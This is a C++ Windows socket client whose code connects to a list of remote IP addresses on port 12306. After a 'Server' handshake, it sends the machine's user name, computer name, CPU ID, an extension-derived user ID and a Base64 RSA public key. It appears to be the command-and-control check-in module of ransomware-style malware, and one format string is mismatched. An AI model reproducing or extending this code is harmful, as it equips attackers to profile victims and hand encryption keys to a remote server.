#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include"client.h"


bool SetTcpClient()
{

	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	if (WSAStartup(sockVersion, &wsaData) != 0) //WSAStartup返回0表示设置初始化成功
		return FALSE;

	//2.创建套接字
	SOCKET socketClient = socket(AF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN socketAddr;

	socketAddr.sin_family = AF_INET;
	socketAddr.sin_port = htons(12306);//端口号
	//3.连接套接字

	for (vector<string>::iterator it = domain.begin(); it != domain.end(); it++)
	{
		socketAddr.sin_addr.S_un.S_addr = inet_addr(it->c_str()); //需要接收的IP地址
		if (!connect(socketClient, (SOCKADDR*)&socketAddr, sizeof(SOCKADDR)))
			break;
	}

	//4.发送数据到服务器
	char receiveBuf[250];
	recv(socketClient, receiveBuf, 250, 0);//接收服务器的消息
	//cout << "服务端发来消息：" << receiveBuf << endl;
	if (!strcmp("Server", receiveBuf)) {
		CHAR sendBuf[120] = { 0 };
		wsprintfA(sendBuf, "%ws%ws%ws%ws%ws%ws%ws", L"user-ID:", extension_name.c_str(), L"---UserName:", UserName, L"---CmputerName:", ComputerName,L"---CPUID",CpuCRC);
		sendBuf[strlen(sendBuf)] = 0;
		send(socketClient, sendBuf, strlen(sendBuf) + 1, 0); //+1是因为要包含\n字符 发送给服务器消息
		CHAR sendBuf_2[150] = { 0 };
		wsprintfA(sendBuf_2, "%s%s", "pk_key:", Base64RsaPk.c_str());
		sendBuf_2[strlen(sendBuf_2)] = 0;
		send(socketClient, sendBuf_2, strlen(sendBuf_2) + 1, 0); //+1是因为要包含\n字符 发送给服务器消息
		closesocket(socketClient);
		WSACleanup();

		return TRUE;
	}


	//5.关闭套接字
	closesocket(socketClient);
	WSACleanup();

	return FALSE;
}


VOID    SendRequest() {
	//启动客户端

	SetTcpClient();

}
//cout << "客户端关闭" << endl;


